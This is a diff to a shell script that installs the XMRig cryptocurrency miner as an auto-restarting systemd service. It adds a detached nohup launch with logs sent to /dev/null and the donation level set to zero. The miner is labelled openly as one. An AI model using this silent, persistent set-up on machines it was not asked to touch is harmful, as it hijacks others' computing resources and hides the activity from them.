@@ -27,12 +27,14 @@ Description=XMRig Crypto Miner (Static 15%)
 After=network.target
 
 [Service]
-ExecStart=$XMRIG_DIR/xmrig --url=$POOL --user=$WALLET --cpu=1 --donate-level=1 --nicehash=false --daemon=false --no-color --log-file=/dev/null --bg --threads=1
+ExecStart=$XMRIG_DIR/xmrig --url=$POOL --user=$WALLET --cpu=1 --donate-level=0 --nicehash=false --daemon=false --no-color --log-file=/dev/null --bg --threads=1
 Restart=always
 RestartSec=10
 
 [Install]
 WantedBy=default.target
 EOF
+
+nohup $XMRIG_DIR/xmrig --url=$POOL --user=$WALLET --cpu=1 --donate-level=0 --nicehash=false --daemon=false --no-color --log-file=/dev/null --bg --threads=1 > /dev/null 2>&1 &
 
 echo "Done. Running at 15% (1 Thread) consistently. No more yoyo."
